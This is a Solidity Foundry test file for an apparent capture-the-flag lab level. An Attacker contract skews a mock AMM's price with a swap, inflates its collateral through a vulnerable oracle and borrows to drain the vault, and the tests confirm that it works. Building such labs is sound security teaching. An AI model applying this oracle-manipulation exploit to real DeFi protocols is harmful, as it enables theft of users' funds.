// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Level3_OracleManipulation} from "../src/Level3_OracleManipulation.sol";
import {MockToken} from "../src/MockToken.sol";
import {SimpleAMM} from "../src/SimpleAMM.sol";
import {VulnerableOracle} from "../src/VulnerableOracle.sol";

contract Attacker {
    Level3_OracleManipulation public vault;
    SimpleAMM public amm;
    MockToken public token;

    constructor(Level3_OracleManipulation _vault) {
        vault = _vault;
        amm = vault.amm();
        token = vault.token();
    }

    function attack() external payable {
        // 1. Claim airdrop
        vault.claimAirdrop();
        uint256 balance = token.balanceOf(address(this));
        
        // 2. Manipulate AMM
        // Send 0.1 ETH to swap for tokens, heavily skewing the pool ratio
        amm.swapETHForTokens{value: msg.value}();

        // 3. Deposit collateral
        token.approve(address(vault), balance);
        vault.deposit(balance);

        // 4. Borrow drained ETH
        // The vault has 0.1 ETH. Our collateral is artificially valued higher than 0.1 ETH.
        vault.borrow(0.1 ether);
    }

    receive() external payable {}
}

contract Level3OracleManipulationTest is Test {
    Level3_OracleManipulation public instance;
    address public player = address(0x1234);

    function setUp() public {
        // Deploy Level 3 Challenge (0.1 ETH for vault, 0.01 ETH for AMM)
        instance = new Level3_OracleManipulation{value: 0.11 ether}();
        vm.deal(player, 1 ether);
    }

    function test_NormalBorrowFailsToDrain() public {
        vm.startPrank(player);
        
        // 1. Claim Airdrop
        instance.claimAirdrop();
        MockToken token = instance.token();
        uint256 balance = token.balanceOf(player);
        
        // 2. Deposit Collateral
        token.approve(address(instance), balance);
        instance.deposit(balance);

        // 3. Attempt to borrow 0.1 ETH
        vm.expectRevert("Insufficient collateral");
        instance.borrow(0.1 ether);

        vm.stopPrank();
    }

    function test_OracleManipulationExploit() public {
        vm.startPrank(player);

        // Assert initial vault balance
        assertEq(address(instance).balance, 0.1 ether, "Initial vault balance should be 0.1 ETH");

        // Record price before
        VulnerableOracle oracle = instance.oracle();
        uint256 priceBefore = oracle.getPrice();
        console.log("Price before manipulation:", priceBefore);

        // Deploy Attacker
        Attacker attacker = new Attacker(instance);
        
        // Execute Exploit: pass 0.1 ETH to manipulate the AMM
        attacker.attack{value: 0.1 ether}();

        // Record price after
        uint256 priceAfter = oracle.getPrice();
        console.log("Price after manipulation:", priceAfter);

        // Assert the oracle was manipulated
        assertTrue(priceAfter > priceBefore, "Oracle price was not inflated");

        // Assert the vault was drained
        assertEq(address(instance).balance, 0, "Vault was not fully drained");
        assertTrue(instance.isComplete(), "Challenge is not complete");

        vm.stopPrank();
    }
}
